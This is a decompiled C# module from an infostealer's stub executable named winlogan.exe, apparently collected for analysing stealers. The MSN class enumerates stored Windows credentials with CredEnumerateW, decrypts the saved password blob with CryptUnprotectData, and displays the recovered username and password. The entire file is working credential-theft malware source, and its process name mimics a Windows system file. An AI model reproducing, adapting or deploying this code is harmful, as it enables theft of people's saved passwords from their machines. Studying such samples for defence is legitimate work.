﻿// Decompiled with JetBrains decompiler
// Type: MSN
// Assembly: winlogan.exe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 318DE2DF-1405-4E2E-8CC4-399298931BFA
// Assembly location: C:\Users\ZetSving\Desktop\На разбор Стиллеров\Tht Stealer\Tht Stealer\stub.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Runtime.InteropServices;

[StandardModule]
internal sealed class MSN
{
  public static IntPtr pCredentials = IntPtr.Zero;
  private static MSN.CREDENTIAL Cred;
  public static uint count;
  public static MSN.DATA_BLOB dataIn;
  public static MSN.DATA_BLOB dataOut;
  public static MSN.UserDetails uDetail;

  [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern bool CredEnumerateW(string filter, uint flag, uint count, IntPtr pCredentials);

  [DllImport("crypt32", CharSet = CharSet.Auto, SetLastError = true)]
  internal static extern bool CryptUnprotectData(ref MSN.DATA_BLOB dataIn, int ppszDataDescr, int optionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, MSN.DATA_BLOB pDataOut);

  public static string[] getPwd()
  {
    MSN.Password();
    return new string[2]
    {
      MSN.uDetail.uName,
      MSN.uDetail.uPass
    };
  }

  public static void Password()
  {
    try
    {
      object obj = Marshal.PtrToStructure(Marshal.ReadIntPtr(MSN.pCredentials, 0), MSN.Cred.GetType());
      MSN.CREDENTIAL credential;
      MSN.Cred = obj != null ? (MSN.CREDENTIAL) obj : credential;
      MSN.dataIn.pbData = MSN.Cred.CredentialBlob;
      MSN.dataIn.cbData = MSN.Cred.CredentialBlobSize;
      MSN.CryptUnprotectData(ref MSN.dataIn, 0, 0, 0, 0, 1, MSN.dataOut);
      MSN.dataOut.pbData = MSN.dataIn.pbData;
      MSN.uDetail.uName = MSN.Cred.UserName;
      MSN.uDetail.uPass = Marshal.PtrToStringUni(new IntPtr(MSN.dataOut.pbData));
      MyProject.Forms.Form1.msnt.Text = "Username: " + MSN.uDetail.uName + "\r\nPassword: " + MSN.uDetail.uPass;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  internal struct CREDENTIAL
  {
    public int Flags;
    public int Type;
    [MarshalAs(UnmanagedType.LPWStr)]
    public string TargetName;
    [MarshalAs(UnmanagedType.LPWStr)]
    public string Comment;
    public long LastWritten;
    public int CredentialBlobSize;
    public int CredentialBlob;
    public int Persist;
    public int AttributeCount;
    public IntPtr Attributes;
    [MarshalAs(UnmanagedType.LPWStr)]
    public string TargetAlias;
    [MarshalAs(UnmanagedType.LPWStr)]
    public string UserName;
  }

  internal struct DATA_BLOB
  {
    public int cbData;
    public int pbData;
  }

  internal struct UserDetails
  {
    public string uName;
    public string uPass;
  }
}
